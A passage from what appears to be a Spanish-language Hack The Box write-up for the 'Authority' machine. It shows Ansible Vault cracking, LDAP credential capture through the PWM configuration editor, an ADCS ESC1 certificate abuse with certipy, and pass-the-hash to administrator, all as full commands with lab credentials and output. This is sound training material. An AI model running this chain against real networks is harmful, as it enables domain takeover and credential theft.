    <p>Nos piden credenciales supongo que la contrase√±a debe ser la del alg√∫n vault <a href="https://github.com/pwm-project/pwm">https://github.com/pwm-project/pwm</a>.</p>
  </li>
  <li>
    <p>Vamos generar los hashes con <code class="language-plaintext highlighter-rouge">ansible2john</code> <a href="https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/">https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>vault1
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

‚ùØ <span class="nb">cat </span>vault2
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

‚ùØ <span class="nb">cat </span>vault3
<span class="nv">$ANSIBLE_VAULT</span><span class="p">;</span>1.1<span class="p">;</span>AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
</code></pre></div></div>

<ul>
  <li>Generamos los hashes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ansible2john vault1
vault1:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d<span class="k">*</span>e041732f9243ba0484f582d9cb20e148<span class="k">*</span>4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
‚ùØ ansible2john vault2
vault2:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5<span class="k">*</span>1dff07007e7a25e438e94de3f3e605e1<span class="k">*</span>66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
‚ùØ ansible2john vault3
vault3:<span class="nv">$ansible$0</span><span class="k">*</span>0<span class="k">*</span>c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93<span class="k">*</span>dfd9eec07341bac0e13c62fe1d0a5f7d<span class="k">*</span>d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
</code></pre></div></div>

<ul>
  <li>Si los crackeamos vemos que todos tiene la misma contrase√±a.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts <span class="o">(</span>ansible, Ansible Vault <span class="o">[</span>PBKDF2-SHA256 HMAC-256 512/512 AVX512BW 16x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 10000 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault2<span class="o">)</span>
<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault1<span class="o">)</span>
<span class="o">!</span>@#<span class="nv">$%</span>^&amp;<span class="k">*</span>         <span class="o">(</span>vault3<span class="o">)</span>
3g 0:00:00:53 DONE <span class="o">(</span>2024-07-10 17:56<span class="o">)</span> 0.05621g/s 745.8p/s 2237c/s 2237C/s 051790..victor2
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Ahora que tenemos la contrase√±a podemos hacer el <code class="language-plaintext highlighter-rouge">decrypt</code> al <code class="language-plaintext highlighter-rouge">Vault</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ pipx <span class="nb">install </span>ansible-core
  installed package ansible-core 2.17.1, installed using Python 3.11.9
  These apps are now globally available
    - ansible
    - ansible-config
    - ansible-connection
    - ansible-console
    - ansible-doc
    - ansible-galaxy
    - ansible-inventory
    - ansible-playbook
    - ansible-pull
    - ansible-test
    - ansible-vault
<span class="k">done</span><span class="o">!</span> ‚ú® üåü ‚ú®
</code></pre></div></div>

<ul>
  <li>Y tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ansible-vault decrypt vault1
Vault password:
Decryption successful
‚ùØ <span class="nb">ls</span>
‚ùØ ansible-vault decrypt vault2
Vault password:
Decryption successful
‚ùØ ansible-vault decrypt vault3
Vault password:
Decryption successful
‚ùØ <span class="nb">cat </span>vault1
svc_pwm                                                                                 

‚ùØ <span class="nb">cat </span>vault2
pWm_@dm!N_!23                                                                           

‚ùØ <span class="nb">cat </span>vault3
DevT3st@123%            
</code></pre></div></div>

<ul>
  <li>Si verificamos vemos que la credencial es correcta para el usuario pero no podemos listar recursos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ cme smb 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
‚ùØ cme smb 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span> <span class="nt">--shares</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span>-] Error enumerating shares: STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Sin embargo probando otros servicios tampoco nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ cme winrm 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23
‚ùØ cme ldap 10.10.11.222 <span class="nt">-u</span> svc_pwm <span class="nt">-p</span> <span class="s1">'pWm_@dm!N_!23'</span>
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.10.11.222    445    AUTHORITY        <span class="o">[</span>-] authority.htb<span class="se">\s</span>vc_pwm:pWm_@dm!N_!23 Error connecting to the domain, are you sure LDAP service is running on the target ?
</code></pre></div></div>

<ul>
  <li>Si probamos las credenciales en el panel de login de <code class="language-plaintext highlighter-rouge">pwm</code> no nos deja entrar <a href="https://github.com/pwm-project/pwm">https://github.com/pwm-project/pwm</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/3.png" />
</p>

<ul>
  <li>Si le damos <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">Configuration Editor</code> nos lleva aqu√≠.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/4.png" />
</p>

<ul>
  <li>Si pegamos la contrase√±a que tenemos y le damos a <code class="language-plaintext highlighter-rouge">Sign in</code> nos deja entrar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/5.png" />
</p>

<h2 id="shell-as-svc_ldap-and-user-flag">Shell as svc_ldap and user flag</h2>

<ul>
  <li>Vemos que esta el usuario <code class="language-plaintext highlighter-rouge">svc_ldap</code> y la contrase√±a esta guardada all√≠ como en la parte de LDAP <code class="language-plaintext highlighter-rouge">URLs</code> nos deja agregar un <code class="language-plaintext highlighter-rouge">Value</code> podemos poner nuestra <code class="language-plaintext highlighter-rouge">ip</code> y ponernos en escucha en el puerto que opera LDAP por defecto que es el <code class="language-plaintext highlighter-rouge">389</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 389
listening on <span class="o">[</span>any] 389 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/authority/6.png" />
</p>

<ul>
  <li>Despu√©s de la damos en <code class="language-plaintext highlighter-rouge">Save</code> y si nos vamos al <code class="language-plaintext highlighter-rouge">netcat</code> tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 389
listening on <span class="o">[</span>any] 389 ...
connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.222] 61273
0Y<span class="sb">`</span>T<span class="p">;</span><span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htblDaP_1n_th3_cle4r!
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>creds.txt
svc_ldap:lDaP_1n_th3_cle4r!
</code></pre></div></div>

<ul>
  <li>Son correctas y nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ cme winrm 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ evil-winrm <span class="nt">-i</span> 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> lDaP_1n_th3_cle4r!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
802832b5ae3b3fb19108fd495fdb7232
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">.pfx</code> que es un archivo para almacenar certificados digitales y claves privadas de manera segura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir


    </span>Directory: C:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        4/23/2023   6:16 PM                Certs
d-----        3/28/2023   1:59 PM                Department Shares
d-----        3/17/2023   9:20 AM                Development
d-----         8/9/2022   7:00 PM                inetpub
d-----        3/24/2023   8:22 PM                PerfLogs
d-r---        3/25/2023   1:20 AM                Program Files
d-----        3/25/2023   1:19 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d-----        7/11/2024  12:24 AM                pwm
d-r---        3/24/2023  11:27 PM                Users
d-----        7/12/2023   1:19 PM                Windows
<span class="nt">-a----</span>        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>Certs
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\C</span>erts&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\C</span>erts


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        4/23/2023   6:11 PM           4933 LDAPs.pfx
</code></pre></div></div>

<ul>
  <li>Como en otras m√°quinas tendremos que trabajar con ADCS (Active Directory Certificate Services) <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a> podemos usar el .exe dentro de la m√°quina para identificar <code class="language-plaintext highlighter-rouge">templates</code> o hacerlo desde nuestra m√°quina de atacante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ pipx <span class="nb">install </span>certipy-ad
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora buscamos por <code class="language-plaintext highlighter-rouge">templates</code> vulnerables.</p>
  </li>
  <li>
    <p>Tenemos que agregar ese subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ certipy find <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-target</span> authority.htb <span class="nt">-text</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 37 certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 13 enabled certificate templates
<span class="o">[!]</span> Failed to resolve: authority.authority.htb
</code></pre></div></div>

<ul>
  <li>Ahora ya funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ certipy find <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-target</span> authority.htb <span class="nt">-text</span> <span class="nt">-stdout</span> <span class="nt">-vulnerable</span>
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 37 certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 13 enabled certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA
<span class="o">[!]</span> Got error <span class="k">while </span>trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> via RRP
<span class="o">[!]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>AUTHORITY-CA, <span class="nv">DC</span><span class="o">=</span>authority, <span class="nv">DC</span><span class="o">=</span>htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption <span class="k">for </span>Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB<span class="se">\A</span>dministrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB<span class="se">\A</span>dministrators
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
        ManageCa                        : AUTHORITY.HTB<span class="se">\A</span>dministrators
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
        Enroll                          : AUTHORITY.HTB<span class="se">\A</span>uthenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB<span class="se">\D</span>omain Computers
                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Owner Principals          : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Dacl Principals           : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
        Write Property Principals       : AUTHORITY.HTB<span class="se">\D</span>omain Admins
                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
    <span class="o">[!]</span> Vulnerabilities
      ESC1                              : <span class="s1">'AUTHORITY.HTB\\Domain Computers'</span> can enroll, enrollee supplies subject and template allows client authentication
</code></pre></div></div>

<ul>
  <li>
    <p>Y bueno nos reporta ESC1 en CorpVPN <a href="https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8">https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8</a> antes de explotar eso necesitamos agregar un computer account.</p>
  </li>
  <li>
    <p>Si verificamos cuantas cuentas de equipo puede crear un usuario normal sin privilegios administrativos vemos que 10 as√≠ que no tendremos problemas.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ cme ldap 10.10.11.222 <span class="nt">-u</span> svc_ldap <span class="nt">-p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="nt">-M</span> MAQ
SMB         10.10.11.222    445    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAPS       10.10.11.222    636    AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.10.11.222    389    AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
</code></pre></div></div>

<ul>
  <li>Vamos agregar la computadora.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ impacket-addcomputer <span class="s1">'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'</span> <span class="nt">-method</span> LDAPS <span class="nt">-computer-name</span> <span class="s1">'miguel'</span> <span class="nt">-computer-pass</span> <span class="s1">'miguel123'</span> <span class="nt">-dc-ip</span> 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added machine account miguel<span class="nv">$ </span>with password miguel123.
</code></pre></div></div>

<ul>
  <li>Sincronizamos nuestro reloj con el del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">sudo </span>ntpdate 10.10.11.222
</code></pre></div></div>

<ul>
  <li>Ahora vamos a obtener el certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ certipy req <span class="nt">-username</span> <span class="s1">'miguel$'</span> <span class="nt">-password</span> miguel123 <span class="nt">-ca</span> AUTHORITY-CA <span class="nt">-dc-ip</span> 10.10.11.222 <span class="nt">-template</span> CorpVPN <span class="nt">-upn</span> administrator@authority.htb <span class="nt">-dns</span> authority.htb
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with multiple identifications
    UPN: <span class="s1">'administrator@authority.htb'</span>
    DNS Host Name: <span class="s1">'authority.htb'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator_authority.pfx'</span>
</code></pre></div></div>

<ul>
  <li>Ahora solicitamos el <code class="language-plaintext highlighter-rouge">hash</code> del administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ certipy auth <span class="nt">-pfx</span> administrator_authority.pfx
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found multiple identifications <span class="k">in </span>certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Please <span class="k">select </span>one:
    <span class="o">[</span>0] UPN: <span class="s1">'administrator@authority.htb'</span>
    <span class="o">[</span>1] DNS Host Name: <span class="s1">'authority.htb'</span>
<span class="o">&gt;</span> 0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@authority.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'administrator.ccache'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@authority.htb'</span>: aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
</code></pre></div></div>

<ul>
  <li>Son credenciales validas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ cme winrm 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>
SMB         10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
HTTP        10.10.11.222    5985   AUTHORITY        <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        <span class="o">[</span>+] authority.htb<span class="se">\a</span>dministrator:6961f422924da90a6928197429eea4ed <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ evil-winrm <span class="nt">-i</span> 10.10.11.222 <span class="nt">-u</span> administrator <span class="nt">-H</span> <span class="s1">'6961f422924da90a6928197429eea4ed'</span>
                                   
Evil-WinRM shell v3.5
                                   
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
                                   
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                   
Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
6f14e5def2f1681729325fa02fcbefb5
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>En caso de que no pudieras solicitar el hash puedes emplear este ataque <a href="https://github.com/AlmondOffSec/PassTheCert">https://github.com/AlmondOffSec/PassTheCert</a>.</p>
  </li>
  <li>
    <p>Para esto necesitamos la <code class="language-plaintext highlighter-rouge">key</code> y un certificado.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nocert</span> <span class="nt">-out</span> administrator.key
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing private key to <span class="s1">'administrator.key'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ certipy cert <span class="nt">-pfx</span> administrator_authority.pfx <span class="nt">-nokey</span> <span class="nt">-out</span> administrator.crt
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing certificate and  to <span class="s1">'administrator.crt'</span>
